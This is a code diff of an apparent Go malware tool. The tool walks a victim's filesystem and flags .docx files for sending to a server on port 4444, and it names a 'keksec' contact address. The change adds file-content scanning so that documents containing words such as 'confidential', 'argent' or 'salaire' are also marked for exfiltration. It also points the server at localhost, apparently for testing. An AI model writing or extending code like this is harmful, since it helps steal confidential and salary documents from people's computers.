@@ -28,6 +28,7 @@ import (
 
 var (
 	ToKeep []string = []string{ ".*\\.docx" }
+	SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("argent"), []byte("salaire") }
 )
 
 type keeper struct {
@@ -80,7 +81,7 @@ func visit(files *[]keeper) filepath.WalkFunc {
             return nil
         }
 
-		k.filename = path
+	k.filename = path
         for _, value := range ToKeep {
             if b, _ := regexp.Match(value, []byte(filepath.Base(path))); b {
                 k.toSend = true
@@ -89,6 +90,24 @@ func visit(files *[]keeper) filepath.WalkFunc {
                 k.toSend = false
             }
         }
+
+	f, err := os.OpenFile(path, os.O_RDONLY, 0755)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer f.Close()
+
+	buf := bytes.NewBuffer(nil)
+	io.Copy(buf, f)
+
+	for _, b := range SensitiveContent {
+		if bytes.Contains(buf.Bytes(), b) {
+			k.toSend = true
+			break
+		} else {
+			k.toSend = false
+		}
+	}
 
         *files = append(*files, k)
         return nil
@@ -167,7 +186,7 @@ func DownloadFiles(k *keeper) {
     fmt.Println(resp.StatusCode)
 }
 
-var server string = "192.168.0.23:4444" // server address
+var server string = "127.0.0.1:4444" // server address
 var contact string = "keksec@kek.hq" // whatever address suits you
 
 func main() {
